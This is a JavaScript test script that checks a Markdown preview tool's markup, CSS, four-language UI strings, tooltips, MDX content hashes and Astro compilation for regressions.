eq('v2 engine exact SHA256 unchanged', sha(engineExact), '62ccfe2402400e7dbaa4f62674ee75e1929b9a516c49ad4e88f483f72efb43a8');
eq('v2 runtime excluding i18n migration remains byte exact', sha(clientScript.replace("    var t = JSON.parse(document.querySelector('.mp-wrap').dataset.strings);\n\n", '')), '37c944c7e32b4f195f36ef703228cc7847d4491f9a5177fd96dbe416a56b98b3');
eq('v2 original English sample remains byte exact', sha(source.match(/editor.value = \[([\s\S]*?)\]\.join/)[1]), 'ed859ff4a01b5ac0dd535eb650b3f4c3257594b1bce5c6051a66fd4828ab8fde');
eq('v2 original prose content styling remains byte exact', sha(source.slice(source.indexOf('  /* Prose styles'), source.indexOf('  @media (prefers-color-scheme: dark)'))), '14cdada07a24993afdfbc7a998593516f318c71dce8c8e88b176bc3b55c44924');
check('v2 direct tool root', /^\s*<div class="mp-wrap"/.test(markup));
check('v2 toolbar then reserved status then panes', /class="mp-toolbar"[\s\S]*id="mp-status"[\s\S]*class="mp-panes zt-io"/.test(markup));
eq('v2 two shared panes', (markup.match(/zt-io-pane/g) || []).length, 2);
eq('v2 two shared fills', (markup.match(/zt-io-fill/g) || []).length, 2);
eq('v2 functional buttons unchanged', JSON.stringify([...markup.matchAll(/<button id="([^"]+)"/g)].map(m => m[1])), JSON.stringify(['mp-copy-html', 'mp-clear']));
check('v2 preview keyboard scroll region has a real heading', /id="mp-preview"[^>]*tabindex="0"[^>]*role="region"[^>]*aria-labelledby="mp-preview-label"/.test(markup) && markup.includes('id="mp-preview-label"'));
check('v2 editor label is associated', /<label[^>]*for="mp-editor"/.test(markup));
check('v2 tips are outside labels and buttons', !/<(label|button)\b[^>]*>(?:(?!<\/\1>)[\s\S])*<Toggletip/.test(markup));
eq('v2 actual tip control bindings', JSON.stringify([...markup.matchAll(/<Toggletip id="([^"]+)" lang=\{lang\} about=\{T\.(\w+)\}>\{TIPS\.(\w+)\}/g)].map(m => m.slice(1))), JSON.stringify([
  ['mp-tip-copy', 'copyHtml', 'copy'], ['mp-tip-clear', 'clear', 'clear'], ['mp-tip-count', 'countLabel', 'count'], ['mp-tip-editor', 'markdownLabel', 'editor'], ['mp-tip-preview', 'previewLabel', 'preview'],
]));
check('v2 no runtime i18n replacement', !/data-i18n|var STRINGS|pageLang/.test(clientScript + markup));
check('v2 root flex column has zero minima', /\.mp-wrap\s*\{[^}]*display:\s*flex;[^}]*flex-direction:\s*column;[^}]*min-width:\s*0;[^}]*min-height:\s*0;/.test(cssSource));
check('v2 fixed status internally scrolls', /\.mp-status\s*\{[^}]*height:\s*1\.5rem;[^}]*min-height:\s*1\.5rem;[^}]*flex:\s*none;[^}]*overflow:\s*auto;/.test(cssSource));
check('v2 input and preview both bound long content', /\.mp-editor-pane textarea\s*\{[^}]*min-width:\s*0;[^}]*overflow:\s*auto;/.test(cssSource) && /\.mp-preview\s*\{[^}]*min-width:\s*0;[^}]*overflow:\s*auto;/.test(cssSource));
check('v2 shared fill keeps zero basis', /\.zt-io-fill\s*\{[^}]*flex:\s*1 1 0;/.test(readFileSync(join(root, 'src/styles/tool-common.css'), 'utf8')));
check('v2 mobile sizes remain bounded', /@media \(max-width: 860px\)[\s\S]*height: 180px;[\s\S]*height: 320px;[\s\S]*@media \(max-width: 640px\)[\s\S]*height: 144px;[\s\S]*height: 280px;/.test(cssSource));
check('v2 primary operations retain 44px touch target', /\.mp-toolbar button\s*\{\s*min-height:\s*44px;/.test(cssSource));
check('v2 phone count keeps its row when empty', /@media \(max-width: 640px\)\s*\{\s*\.mp-count\s*\{\s*flex-basis:\s*100%;\s*justify-content:\s*flex-end;\s*min-height:\s*28px;/.test(cssSource));
check('v2 empty desktop hint follows actual empty preview', /\.mp-preview-pane:has\(\.mp-preview:empty\) \.mp-empty-preview\s*\{\s*display:\s*block;/.test(cssSource));
check('v2 empty preview hides only at stacked width', /@media \(max-width: 860px\)\s*\{[\s\S]*?\.mp-preview-pane:has\(\.mp-preview:empty\)\s*\{\s*display:\s*none;/.test(cssSource));
check('v2 image notice follows actual nonempty dynamic image source', cssSource.includes(':global(.mp-preview-pane:has(img[src]:not([src=""]))) .mp-image-notice { display: block; }'));
check('v2 notice is outside copied/highlighted preview', /id="mp-preview"[^>]*><\/div>[\s\S]*id="mp-image-notice"/.test(markup));
check('v2 selected kind is convert', /['"]markdown-preview['"]\s*:\s*['"]convert['"]/.test(readFileSync(join(root, 'src/data/tool-layouts.ts'), 'utf8')));
const PROTECTED_MDX = {
  "en": {
    "beforeSHA256": "1d87ac51524f74a452f023e34f6e0bbacce7f38d2d2eceffa3f9543bdcc1de71",
    "frontSHA256": "e11be4ccb18a7155fd723ac95d66159fc950bfb00e934ed5f1b6637d20e65846",
    "bodyWithoutUsageSHA256": "d6238557d74c19ea79e254f72a98ed2f78117cbb6124b2677559230f76351ddc"
  },
  "zh": {
    "beforeSHA256": "f34b51b8248acd93e3908c21058b46d5f15ca3c10097ea7c6be48128911d9169",
    "frontSHA256": "1fa3e1e14d0a9c9607764a497be7f10e703008863d8c38a4caf35ee290cfbada",
    "bodyWithoutUsageSHA256": "84b3229158d2321c2481aed8f0585fce9d54a37dbf85f4382a5889913429c9c2"
  },
  "ja": {
    "beforeSHA256": "1431c81247e41eb72925fd03b14ca0e007bf8443ea6f46fe3fa1ef4bc8afadea",
    "frontSHA256": "14ad6560c8dba353f539615ed89193535e5d15d8e59a65ceb9416b90d19fd88c",
    "bodyWithoutUsageSHA256": "3d36f747981b1afa5f40bddc97c3cbdd579465df3760bc747bdcf1c3fdbb78ed"
  },
  "ko": {
    "beforeSHA256": "7f8c5ec3ad05306a48113037f1213980dd0574fb381bf1e3c9bd0b891557f15a",
    "frontSHA256": "7dda2ff91129122a1590356aa583006472d5b4746f45bfe7f041eb94ec37e1f0",
    "bodyWithoutUsageSHA256": "5371d548dc22582b372de927beae8ce3ef7b0d0d64fcff2807bb431e1c3dcd32"
  }
};
const legacyKeys = ['copyHtml','clear','copied','copyFailed','markdownLabel','previewLabel','wordsSep','charsSep'];
const LEGACY_STRINGS = {
  "en": {
    "copyHtml": "Copy HTML",
    "clear": "Clear",
    "copied": "Copied!",
    "copyFailed": "Copy failed",
    "markdownLabel": "Markdown",
    "previewLabel": "Preview",
    "wordsSep": "words",
    "charsSep": "chars"
  },
  "zh": {
    "copyHtml": "复制 HTML",
    "clear": "清除",
    "copied": "已复制！",
    "copyFailed": "复制失败",
    "markdownLabel": "Markdown",
    "previewLabel": "预览",
    "wordsSep": "词",
    "charsSep": "字符"
  },
  "ja": {
    "copyHtml": "HTML コピー",
    "clear": "クリア",
    "copied": "コピー済み！",
    "copyFailed": "コピー失敗",
    "markdownLabel": "Markdown",
    "previewLabel": "プレビュー",
    "wordsSep": "語",
    "charsSep": "文字"
  },
  "ko": {
    "copyHtml": "HTML 복사",
    "clear": "지우기",
    "copied": "복사됨!",
    "copyFailed": "복사 실패",
    "markdownLabel": "Markdown",
    "previewLabel": "미리보기",
    "wordsSep": "단어",
    "charsSep": "문자"
  }
};
const yaml = requireRoot('js-yaml');
const mdx = await import(requireRoot.resolve('@mdx-js/mdx'));
for (const lang of ['en', 'zh', 'ja', 'ko']) {
  const T = STRINGS[lang], payload = clientStrings(lang), p = page({ lang });
  eq(lang + ' v2 five complete tip keys', JSON.stringify(Object.keys(T.tips)), JSON.stringify(['editor','preview','copy','clear','count']));
  check(lang + ' v2 tips are short plain text', Object.values(T.tips).every(t => typeof t === 'string' && t.length > 0 && [...t].length <= 280 && !/[<>]/.test(t)));
  check(lang + ' v2 actual client payload excludes all tips', !Object.hasOwn(payload, 'tips') && !Object.values(T.tips).some(t => JSON.stringify(payload).includes(t)));
  eq(lang + ' v2 original eight strings are exact', JSON.stringify(Object.fromEntries(legacyKeys.map(k => [k, payload[k]]))), JSON.stringify(LEGACY_STRINGS[lang]));
  eq(lang + ' v2 initial button is build-time localized', p.copy.textContent, pageLabels[lang].copy);
  eq(lang + ' v2 empty message is built in current locale', p.$('mp-empty-preview').textContent, T.emptyPreview);
  eq(lang + ' v2 image notice is built in current locale', p.$('mp-image-notice').textContent, T.imageNotice);
  check(lang + ' v2 image notice lies outside preview', !p.preview.contains(p.$('mp-image-notice')));
  p.render('![image](https://example.com/image.png)');
  p.copy.click(); eq(lang + ' v2 visible image never adds privacy message to copied HTML', p.requests[0].value, '<p><img src="https://example.com/image.png" alt="image" /></p>');
  p.requests[0].resolve(); await settlePage();
  p.render('![image](data:image/png;base64,AAAA)');
  eq(lang + ' v2 rejected protocol still gives an empty image source', p.preview.innerHTML, '<p><img src="" alt="image" /></p>');
  for (const order of ['before', 'after']) {
    const q = page({ lang, order }); q.type('# queued'); q.clearKey(false, 'mp-tip-preview-trigger');
    eq(lang + '/' + order + ' v2 tip focus CtrlL returns to visible editor', q.document.activeElement?.id, 'mp-editor');
    eq(lang + '/' + order + ' v2 tip focus CtrlL clears shared storage', JSON.stringify(q.clears), '["markdown-preview"]');
    q.advance(300); eq(lang + '/' + order + ' v2 tip focus CtrlL cancels queued preview', q.preview.innerHTML, '');
  }
  const content = readFileSync(join(root, 'src/content/tools/markdown-preview', lang + '.mdx'), 'utf8');
  const [, front, body] = content.match(/^---\n([\s\S]*?)\n---\n([\s\S]*)$/), data = yaml.load(front), expected = PROTECTED_MDX[lang];
  check(lang + ' v2 four steps precede FAQ', Array.isArray(data.steps) && data.steps.length === 4 && front.indexOf('steps:') < front.indexOf('faqItems:'));
  check(lang + ' v2 step limits 8/280/1200', data.steps.length <= 8 && data.steps.every(s => [...s].length <= 280) && data.steps.reduce((n,s) => n + [...s].length, 0) <= 1200);
  eq(lang + ' v2 SEO/FAQ/frontmatter unchanged', sha(front.replace(/steps:\n[\s\S]*?(?=faqItems:)/, '')), expected.frontSHA256);
  eq(lang + ' v2 only Usage removed from body', sha(body), expected.bodyWithoutUsageSHA256);
  check(lang + ' v2 Usage absent', !/<h2>(?:How to Use|使用方法|使い方|사용 방법)<\/h2>/.test(body));
  let mdxError = ''; try { await mdx.compile(body); } catch (e) { mdxError = String(e); }
  eq(lang + ' v2 remaining body compiles', mdxError, '');
}
const { transform } = await import(requireRoot.resolve('@astrojs/compiler', { paths: [requireRoot.resolve('astro')] }));
const compiled = await transform(source, { filename: componentPath });
eq('v2 Astro has no error diagnostics', JSON.stringify(compiled.diagnostics.filter(d => d.severity === 1)), '[]');
eq('v2 Astro preserves one client module', compiled.scripts.length, 1);
check('v2 Astro client module excludes tip text', !Object.values(STRINGS).some(s => Object.values(s.tips).some(t => compiled.scripts.some(script => script.code.includes(t)))));
check('v2 compiled dynamic image selector has no scoped attribute on img', compiled.css.some(css => /:has\(img\[src\]:not\(\[src=""\]\)\)/.test(css)));
let compileError = ''; try { await requireRoot('esbuild').transform(compiled.code, { loader: 'ts', format: 'esm' }); } catch (e) { compileError = String(e); }
eq('v2 generated Astro module parses', compileError, '');

console.log(`\n${passes} passed, ${failures} failed`);
process.exit(failures ? 1 : 0);
